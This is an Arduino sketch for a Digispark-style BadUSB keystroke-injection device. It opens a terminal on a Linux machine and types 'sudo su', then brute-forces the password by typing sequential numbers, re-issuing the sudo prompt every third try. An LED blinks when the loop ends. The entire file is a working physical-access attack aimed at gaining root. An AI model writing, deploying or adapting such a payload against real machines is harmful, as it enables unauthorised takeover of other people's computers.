#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("sudo su");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(int i = 0; i < 9999; i++) {
    if(i % 3 != 0 || i == 0) {
      DigiKeyboard.print(i);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(3000);
    }
    else {
      DigiKeyboard.print("sudo su");
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(500);
    }
  }
  
  //DigiKeyboard.print("exit");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  while(1) {
    digitalWrite(1, HIGH);
    delay(500);
    digitalWrite(1, LOW);
    delay(500);
  }
}
